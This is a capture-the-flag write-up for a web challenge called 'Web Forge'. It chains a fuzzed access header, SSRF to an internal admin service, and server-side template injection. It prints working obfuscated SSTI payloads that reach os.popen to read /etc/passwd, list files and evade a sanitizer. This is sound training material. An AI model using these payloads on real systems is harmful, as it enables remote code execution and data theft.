#### Web Forge
- points earned: TBD 

#### Notes
- The first thing I checked was robots.txt which shows `/admin` and `/fetch`. It also shares some intel, `# internal SSRF testing tool requires special auth header to be set to 'true'`.
- `/admin` returns a `403 - FORBIDDEN`
- `/fetch` also returns a `403 - FORBIDDEN` but also contains `403 Forbidden: missing or incorrect SSRF access header` in its response body.
- So at this point it would seem that I need to discover a request header and set it to true in order to access `/fetch`
- I manually tried a few headers that I could think of but none would let me into `fetch`.
- Eventually I ended up trying `fuff` to check against a list of headers and found that `Allow: true` was the one I was looking for. (lol because I didn't guess this)
- Now that I have access on `fetch` and it appears to be a tool that will send web requests for me, I want to try and use it to access `/admin`.
- Trying `http://127.0.0.1/admin` results in the below output
    ```
    HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7989bc777ac0>: Failed to establish a new connection: [Errno 111] Connection refused'))
    ```
- I see `Connection refused` which makes me think there's no server where I tried to send the request.
- Perhaps a different port?  I manually tried a bunch of standard ports (3000, 5000, etc) and eventually got a different response for port 8000. That response contained a helpful error `Missing template parameter`.
- Trying `http://127.0.0.1:8000/admin?template=meow` now gives me a response without errors and reflects my input, `meow`, into the response
- After some messing around with this, I started to wonder if the parameter name `template` was hinting that this input is being used in a template.
- I then tried `http://127.0.0.1:8000/admin?template={{4*4}}` which returned a response which contained `16` and confirms SSTI.

#### Solution
- I used the following payload, which I had in my notes, to confirm RCE.
    ```python
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /etc/passwd')|attr('read')()}}
    ```
- I used the following payload to list the contents of the current directory and could see `flag.txt` was in there.
```python
http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -l')|attr('read')()}}
```
- I then tried `cat flag.txt` to read the flag but got a response `Nope` which feels like it was caught by a sanatizer.
- Then I just tried obfuscating the `.` in `flag.txt` with `\x2e` and the flag was returned.  Final payload below.
```python
http://127.0.0.1:8000/admin?template={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag\x2etxt')|attr('read')()}}
```